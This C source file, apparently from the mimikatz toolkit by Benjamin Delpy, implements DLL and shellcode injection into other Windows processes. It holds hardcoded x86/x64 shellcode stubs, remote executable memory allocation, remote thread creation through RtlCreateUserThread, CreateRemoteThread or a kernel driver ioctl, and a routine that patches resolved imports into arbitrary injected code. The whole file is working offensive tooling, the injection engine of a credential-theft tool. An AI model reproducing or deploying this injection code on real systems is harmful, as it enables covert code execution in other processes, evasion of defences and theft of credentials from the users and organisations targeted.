/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kull_m_remotelib.h"

#ifdef _M_IX86
BYTE RemoteLoadLibrarySC[] = {0x55, 0x8b, 0xec, 0x8b, 0x45, 0x08, 0x83, 0xc0, 0x0c, 0x50, 0xb8, 0x61, 0x61, 0x61, 0x61, 0xff, 0xd0, 0x8b, 0x4d, 0x08, 0x89, 0x41, 0x04, 0x33, 0xc0, 0x5d, 0xc2, 0x04, 0x00};
BYTE RemoteFreeLibrarySC[] = {0x55, 0x8b, 0xec, 0x8b, 0x45, 0x08, 0xff, 0x70, 0x04, 0xb8, 0x62, 0x62, 0x62, 0x62, 0xff, 0xd0, 0x8b, 0x4d, 0x08, 0x89, 0x41, 0x04, 0x33, 0xc0, 0x5d, 0xc2, 0x04, 0x00};
#define RemoteLoadLibrarySC_Offset 11
#define RemoteFreeLibrarySC_Offset 10
#elif defined _M_X64
BYTE RemoteLoadLibrarySC[] = {0x48, 0x89, 0x4c, 0x24, 0x08, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x83, 0xc1, 0x14, 0x48, 0xb8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xff, 0xd0, 0x4c, 0x8b, 0xd8, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x4c, 0x89, 0x58, 0x08, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3};
BYTE RemoteFreeLibrarySC[] = {0x48, 0x89, 0x4c, 0x24, 0x08, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8b, 0x49, 0x08, 0x48, 0xb8, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0xff, 0xd0, 0x48, 0x63, 0xc8, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x48, 0x89, 0x48, 0x08, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3};
#define RemoteLoadLibrarySC_Offset 20
#define RemoteFreeLibrarySC_Offset 20
#endif

#pragma optimize("", off)
typedef HMODULE (WINAPI * PLOADLIB) (LPCWSTR lpLibFileName);
typedef BOOL (WINAPI * PFREELIB) (HMODULE hModule);
DWORD WINAPI ThreadProcLoadLibraryRemote(PREMOTE_LIB_FUNC lpParameter)
{
	lpParameter->outputData = ((PLOADLIB) 'aaaa') ((LPCWSTR) lpParameter->inputData);
	return STATUS_SUCCESS;
}

DWORD WINAPI ThreadProcFreeLibraryRemote(PREMOTE_LIB_FUNC lpParameter)
{
	lpParameter->outputData = (PVOID) ((PFREELIB) 'bbbb') ((HMODULE) lpParameter->outputData);
	return STATUS_SUCCESS;
}
#pragma optimize("", on)

BOOL CALLBACK kull_m_remotelib_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	if(pExportedEntryInformations->name)
	{
		if(_stricmp(pExportedEntryInformations->name, ((PREMOTE_LIB_GETPROC) pvArg)->lpProcName) == 0)
		{
			((PREMOTE_LIB_GETPROC) pvArg)->addr = (FARPROC) pExportedEntryInformations->function.address;
			return FALSE;
		}
	}
	return TRUE;
}

FARPROC kull_m_remotelib_GetProcAddress(PKULL_M_MEMORY_HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName)
{
	BOOL status;
	REMOTE_LIB_GETPROC getProcArgs = {lpProcName, NULL};
	KULL_M_MEMORY_ADDRESS aRemote = {hModule, hProcess};
	status = kull_m_process_getExportedEntryInformations(&aRemote, kull_m_remotelib_callback_module_exportedEntry, &getProcArgs);

	if(!getProcArgs.addr)
	{
		if(status)
			PRINT_ERROR_AUTO(L"kull_m_process_getExportedEntryInformations");
		else
			PRINT_ERROR(L"GetProcAddressRemote \'%S\' not found\n", lpProcName); 
	}
	return getProcArgs.addr;
}

HMODULE kull_m_remotelib_LoadLibrary(PKULL_M_MEMORY_HANDLE hProcess, LPCWSTR lpFileName)
{
	PWCHAR absolutePath;
	PREMOTE_LIB_FUNC pArgs;
	DWORD szLibName, pArgsSize;
	HMODULE hModule = NULL;
	KULL_M_MEMORY_HANDLE  hLocalBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aRemoteFunc = {NULL, hProcess}, aLocalAddr = {NULL, &hLocalBuffer};
	
	if(kull_m_file_getAbsolutePathOf(lpFileName, &absolutePath))
	{
		if(kull_m_file_isFileExist(absolutePath))
		{
			szLibName = (DWORD) (wcsnlen_s(absolutePath, MAX_PATH) + 1) * sizeof(wchar_t);
			pArgsSize = FIELD_OFFSET(REMOTE_LIB_FUNC, inputData) + szLibName;
			if(pArgs = (PREMOTE_LIB_FUNC) LocalAlloc(LPTR, pArgsSize))
			{
				pArgs->inputSize = szLibName;
				RtlCopyMemory(pArgs->inputData, absolutePath, szLibName);
				*(FARPROC *)(RemoteLoadLibrarySC + RemoteLoadLibrarySC_Offset) = (FARPROC) LoadLibraryW;
				
				if(kull_m_memory_alloc(&aRemoteFunc, sizeof(RemoteLoadLibrarySC), PAGE_EXECUTE_READWRITE))
				{
					aLocalAddr.address = RemoteLoadLibrarySC;
					if(kull_m_memory_copy(&aRemoteFunc, &aLocalAddr, sizeof(RemoteLoadLibrarySC)))
					{
						if(kull_m_remotelib_create(&aRemoteFunc, pArgs, pArgsSize, NULL, NULL, TRUE))
							hModule = (HMODULE) pArgs->outputData;
					}
					else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
					kull_m_memory_free(&aRemoteFunc, 0);
				}
				else PRINT_ERROR_AUTO(L"kull_m_memory_alloc / VirtualAlloc(Ex)");
				LocalFree(pArgs);
			}
		}
		else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
		LocalFree(absolutePath);
	}
	else PRINT_ERROR_AUTO(L"kull_m_file_getAbsolutePathOf");

	return hModule;
}

BOOL kull_m_remotelib_FreeLibrary(PKULL_M_MEMORY_HANDLE hProcess, HMODULE hModule)
{
	BOOL sucess = FALSE;
	REMOTE_LIB_FUNC Args = {0, hModule/* ... */};

	KULL_M_MEMORY_HANDLE  hLocalBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aRemoteFunc = {NULL, hProcess}, aLocalAddr = {RemoteFreeLibrarySC, &hLocalBuffer};

	*(FARPROC *)(RemoteFreeLibrarySC + RemoteFreeLibrarySC_Offset) = (FARPROC) FreeLibrary;

	if(kull_m_memory_alloc(&aRemoteFunc, sizeof(RemoteFreeLibrarySC), PAGE_EXECUTE_READWRITE))
	{
		if(kull_m_memory_copy(&aRemoteFunc, &aLocalAddr, sizeof(RemoteFreeLibrarySC)))
		{
			if(kull_m_remotelib_create(&aRemoteFunc, &Args, sizeof(REMOTE_LIB_FUNC), NULL, NULL, TRUE))
				sucess = (BOOL) Args.outputData;
		}
		else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
		kull_m_memory_free(&aRemoteFunc, 0);
	}
	else PRINT_ERROR_AUTO(L"kull_m_memory_alloc / VirtualAlloc(Ex)");
	return sucess;
}

BOOL kull_m_remotelib_create(PKULL_M_MEMORY_ADDRESS aRemoteFunc, LPVOID inputData, DWORD inputDataSize, LPVOID *outputData, DWORD *outputDataSize, BOOL isRaw)
{
	BOOL success = FALSE;
	NTSTATUS status;
	KULL_M_MEMORY_HANDLE  hLocalBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aRemoteData = {NULL, aRemoteFunc->hMemory}, aSuppData = {NULL, aRemoteFunc->hMemory}, aLocalAddr = {NULL, &hLocalBuffer};
	HANDLE hThread;

	PREMOTE_LIB_FUNC pArgs = NULL;
	DWORD pArgsSize;
	MIMIDRV_THREAD_INFO drvInfo = {(PTHREAD_START_ROUTINE) aRemoteFunc->address, NULL};

	if(isRaw)
	{
		pArgsSize = inputDataSize;
		pArgs = (PREMOTE_LIB_FUNC) inputData;
	}
	else
	{
		if(outputData && outputDataSize)
		{
			*outputData = NULL;
			*outputDataSize = 0;
		}
		pArgsSize = FIELD_OFFSET(REMOTE_LIB_FUNC, inputData) + inputDataSize;
		if(pArgs = (PREMOTE_LIB_FUNC) LocalAlloc(LPTR, pArgsSize))
			if(pArgs->inputSize = inputDataSize)
				RtlCopyMemory(pArgs->inputData, inputData, inputDataSize);
	}
		
	if(kull_m_memory_alloc(&aRemoteData, pArgsSize, PAGE_READWRITE))
	{
		aLocalAddr.address = pArgs;
		if(kull_m_memory_copy(&aRemoteData, &aLocalAddr, pArgsSize))
		{
			switch(aRemoteFunc->hMemory->type)
			{
			case KULL_M_MEMORY_TYPE_PROCESS:
				if(MIMIKATZ_NT_MAJOR_VERSION > 5)
				{
					status = RtlCreateUserThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, &hThread, NULL);
					if(!NT_SUCCESS(status))
					{
						hThread = NULL;
						PRINT_ERROR(L"RtlCreateUserThread (0x%08x)\n", status);
					}
				}
				else if(!(hThread = CreateRemoteThread(aRemoteFunc->hMemory->pHandleProcess->hProcess, NULL, 0, (PTHREAD_START_ROUTINE) aRemoteFunc->address, aRemoteData.address, 0, NULL)))
					PRINT_ERROR_AUTO(L"CreateRemoteThread");

				if(hThread)
				{
					WaitForSingleObject(hThread, INFINITE);
					success = CloseHandle(hThread);
				}
				break;

			case KULL_M_MEMORY_TYPE_KERNEL:
				drvInfo.pArg = aRemoteData.address;
				kprintf(L"Th @ %p\nDa @ %p\n", drvInfo.pRoutine, drvInfo.pArg);
				if(!(success = kull_m_kernel_ioctl_handle(aRemoteFunc->hMemory->pHandleDriver->hDriver, IOCTL_MIMIDRV_CREATEREMOTETHREAD, &drvInfo, sizeof(MIMIDRV_THREAD_INFO), NULL, NULL, FALSE)))
					PRINT_ERROR_AUTO(L"kull_m_kernel_ioctl_handle");
				break;
			}

			if(success)
			{
				success = kull_m_memory_copy(&aLocalAddr, &aRemoteData, isRaw ? pArgsSize : FIELD_OFFSET(REMOTE_LIB_FUNC, inputSize));
				if(!isRaw && success && pArgs->outputData)
				{
					success = FALSE;
					aSuppData.address = pArgs->outputData;
					if(outputData && outputDataSize)
					{
						if(aLocalAddr.address = LocalAlloc(LPTR, pArgs->outputSize))
						{
							if(success = kull_m_memory_copy(&aLocalAddr, &aSuppData, pArgs->outputSize))
							{
								*outputData = aLocalAddr.address;
								*outputDataSize = pArgs->outputSize;
							}
							else LocalFree(aLocalAddr.address);
						}
					}
					kull_m_memory_free(&aSuppData, 0);
				}
			}
		}
		kull_m_memory_free(&aRemoteData, 0);
	}

	if(!isRaw && pArgs)
		LocalFree(pArgs);

	return success;
}

BOOL CALLBACK kull_m_remotelib_exports_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	PREMOTE_EXT extension = (PREMOTE_EXT) pvArg;
	if(pExportedEntryInformations->name)
		if(_stricmp(extension->Function, pExportedEntryInformations->name) == 0)
		{
			extension->Pointer = pExportedEntryInformations->function.address;
			return FALSE;
		}
	return TRUE;
}

BOOL CALLBACK kull_m_remotelib_exports_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	DWORD i;
	PMULTIPLE_REMOTE_EXT extForCb = (PMULTIPLE_REMOTE_EXT) pvArg;
	
	for(i = 0; i < extForCb->count; i++)
	{
		if(extForCb->extensions[i].Pointer)
			continue;
		
		if(_wcsicmp(pModuleInformation->NameDontUseOutsideCallback->Buffer, extForCb->extensions[i].Module) == 0)
			if(kull_m_process_getExportedEntryInformations(&pModuleInformation->DllBase, kull_m_remotelib_exports_callback_module_exportedEntry, extForCb->extensions + i) || !extForCb->extensions[i].Pointer)
				return FALSE;
	}
	return TRUE;
}

BOOL kull_m_remotelib_GetProcAddressMultipleModules(PKULL_M_MEMORY_HANDLE hProcess, PMULTIPLE_REMOTE_EXT extForCb)
{
	DWORD i;
	BOOL success;
	kull_m_process_getVeryBasicModuleInformations(hProcess, kull_m_remotelib_exports_callback_module, extForCb);
	for(i = 0, success = TRUE; (i < extForCb->count) && success; success &= (extForCb->extensions[i++].Pointer != NULL));
	return success;
}

BOOL kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(PKULL_M_MEMORY_HANDLE hProcess, LPCVOID Buffer, DWORD BufferSize, PMULTIPLE_REMOTE_EXT RemoteExt, PKULL_M_MEMORY_ADDRESS DestAddress)
{
	BOOL success = FALSE;
	DWORD i, j;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalAddr = {(LPVOID) Buffer, &hLocalMemory};
	
	DestAddress->hMemory = hProcess;
	DestAddress->address = NULL;
	
	if(RemoteExt)
	{
		if(kull_m_remotelib_GetProcAddressMultipleModules(hProcess, RemoteExt))
		{
			if(aLocalAddr.address = LocalAlloc(LPTR, BufferSize))
			{
				RtlCopyMemory(aLocalAddr.address, Buffer, BufferSize);
				for(i = 0; i < BufferSize - sizeof(PVOID); i++)
				{
					for(j = 0; j < RemoteExt->count; j++)
					{
						if((PVOID) RemoteExt->extensions[j].ToReplace == *(PVOID *) ((PBYTE) aLocalAddr.address + i))
						{
							*(PVOID *) ((PBYTE) aLocalAddr.address + i) = RemoteExt->extensions[j].Pointer;
							//kprintf(L"Found =) - %.*S - %s!%S -> %p\n", sizeof(PVOID), &RemoteExt->extensions[j].ToReplace, RemoteExt->extensions[j].Module, RemoteExt->extensions[j].Function, *(PVOID *) ((PBYTE) aLocalAddr.address + i));
							i += sizeof(PVOID) - 1;
						}
					}
				}
			}
		}
	}

	if(aLocalAddr.address)
	{
		if(kull_m_memory_alloc(DestAddress, BufferSize, PAGE_EXECUTE_READWRITE))
		{
			if(!(success = kull_m_memory_copy(DestAddress, &aLocalAddr, BufferSize)))
			{
				PRINT_ERROR_AUTO(L"kull_m_memory_copy");
				kull_m_memory_free(DestAddress, 0);
			}
		}
		else PRINT_ERROR_AUTO(L"kull_m_memory_alloc / VirtualAlloc(Ex)");

		if(RemoteExt)
			LocalFree(aLocalAddr.address);
	}
	else PRINT_ERROR(L"No buffer ?\n");
	return success;
}